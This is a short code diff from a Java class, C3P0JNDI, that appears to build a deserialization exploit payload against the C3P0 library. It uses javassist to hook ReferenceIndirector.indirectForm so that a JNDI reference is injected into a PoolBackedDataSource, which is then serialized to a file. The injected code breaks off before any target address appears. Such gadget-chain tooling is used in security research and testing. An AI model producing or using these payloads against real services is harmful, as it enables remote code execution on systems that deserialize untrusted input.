@@ -22,10 +22,10 @@ public class C3P0JNDI {
         hook();
         PoolBackedDataSource a = new PoolBackedDataSource();
         a.setConnectionPoolDataSource(new PoolSource());
-//        writeFile("1.txt",serialize(a));
-        deserialize(FiletoBytes("1.txt"));
+        writeFile("1.txt",serialize(a));
+//        deserialize(FiletoBytes("1.txt"));
     }
-    public static void hook() throws ClassNotFoundException, NoSuchMethodException, NotFoundException, CannotCompileException {
+    public static void hook() throws NotFoundException, CannotCompileException {
         CtClass ctClass = ClassPool.getDefault().get("com.mchange.v2.naming.ReferenceIndirector");
         CtMethod ctMethod = ctClass.getDeclaredMethod("indirectForm");
         ctMethod.insertBefore("java.util.Properties properties = new java.util.Properties();\n" +
